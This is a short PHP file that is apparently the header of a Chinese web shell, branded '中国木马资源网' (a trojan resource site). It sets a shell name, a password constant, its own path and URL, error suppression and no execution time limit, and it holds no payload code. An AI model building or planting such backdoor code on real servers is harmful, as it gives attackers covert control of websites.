<?php
$shellname='中国木马资源网- WwW.7jyewu.Cn ';//这里修改标题！
define('myaddress',__FILE__);
error_reporting(E_ERROR | E_PARSE);
header("content-Type: text/html; charset=gb2312");
@set_time_limit(0);

ob_start();
define('envlpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
?>